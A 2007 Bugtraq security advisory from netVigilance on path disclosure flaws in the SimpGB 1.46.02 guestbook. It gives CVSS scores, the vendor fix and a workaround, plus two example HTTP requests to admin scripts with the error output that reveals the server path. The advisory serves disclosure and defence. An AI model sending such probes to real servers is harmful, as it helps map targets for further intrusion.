
Date: 25 Sep 2007 16:20:52 -0000
From: securityresearch@...vigilance.com
To: bugtraq@...urityfocus.com
Subject: SimpGB version 1.46.02 Multiple Path Disclosure Vulnerabilities

	netVigilance Security Advisory #64

SimpGB version 1.46.02 Multiple Path Disclosure Vulnerabilities
Description:
SimpGB is a guestbook with data stored in MySQL, administration interface and support for multiple languages. Features: Data stored in MySQL, Administration interface, Support for multiple languages, Support for multiple instances in one database, Support for multiple layouts, Own header/footer can be defined, Support of BBCode and smilies, Admin can decide which BBCode tags to enable, Avatars (with option to let users upload their own), Admin can decide which input fields to display and which of them are required, Admins can write comments on posts, Admins can mark entry as "always on top", Admins can attach file to entry, flood protection, IP banlist, bad word list, send email notification upon new posts, optionally validate new posts before they get visible by public, own leadtext for entry form and own "Thank you" message can be defined, Option to mark posts as private (only admins can see them), search entries, Option to let users send emails out of guestbook.
External References: 
Mitre CVE: ID requested but no answer received
NVD NIST: ID requested but no answer received
OSVDB: ID requested but no answer received

Summary: 
SimpGB is a guestbook with data stored in MySQL, administration interface and support for multiple languages.
Security problems in the product allow attackers to gather the true path of the server-side script. 

Advisory URL: 
http://www.netvigilance.com/advisory0064

Release Date:
09/25/2007
 
CVSS Version 2 Metrics:

Base Metrics:


Exploitability Metrics:



Access Vector:
Network


Access Complexity:
Low


Authentication:
None

Impact Metrics:



Confidentiality Impact:
Partial


Integrity Impact:
None


Availability Impact:
None
Temporal Metrics:


Exploitability:
Functional

Remediation Level:
Official Fix

Report Confidence:
Confirmed

CVSS Version 2 Vectors:

Base Vector:
"AV:N/AC:L/Au:N/C:P/I:N/A:N"
Temporal Vector:
"E:F/RL:OF/RC:C"


CVSS Version 2 Scores:

Base Score:
5

Impact Subscore:
2.9

Exploitability Subscore:
10
Temporal Score:
4.1
SecureScout Testcase ID:
TC 17983

Vulnerable Systems:
SimpGB version 1.46.02

Vulnerability Type:
Program flaws - The product scripts have flaws which lead to Warnings or even Fatal Errors.
Vendor:
Bosch IT-Consulting

Vendor Status: 
The Vendor has confirmed the problem and has release new version 1.47 that addresses the problem. New version of product was tested and we can confirm that all vulnerabilities were solved.  For more information see vendor announcement. To download the latest version go to vendors product download area.
Workaround:
Disable warning messages: modify in the php.ini file following line: display_errors = Off.
Or modify .htaccess file (this will work only for the apache servers). 
Example: 
Path Disclosure Vulnerability 1:
REQUEST:
http://[TARGET]/[PRODUCT DIRECTORY]/admin/index.php?lang=aa
REPLY:
<b>Warning</b>:  main(./language/lang_aa.php): failed to open stream: No such file or directory in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php</b> on line <b>14</b><br />
<b>Warning</b>:  main(): Failed opening './language/lang_aa.php' for inclusion (include_path='.;c:\php4\pear') in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php</b> on line <b>14</b><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at [DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php:14) in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\heading.php</b> on line <b>112</b><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at [DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php:14) in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\heading.php</b> on line <b>113</b><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at [DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php:14) in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\heading.php</b> on line <b>114</b><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at [DISCLOSED PATH][PRODUCT DIRECTORY]\admin\index.php:14) in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\heading.php</b> on line <b>115</b><br />
Path Disclosure Vulnerability 2:
REQUEST:
http://[TARGET]/[PRODUCT DIRECTORY]/admin/trailer.php
REPLY:
<b>Fatal error</b>:  Call to undefined function:  do_url_session() in <b>[DISCLOSED PATH][PRODUCT DIRECTORY]\admin\trailer.php</b> on line <b>7</b><br />
Credits: 
Jesper Jurcenoks
Co-founder netVigilance, Inc
www.netvigilance.com

??

??

??

??




	
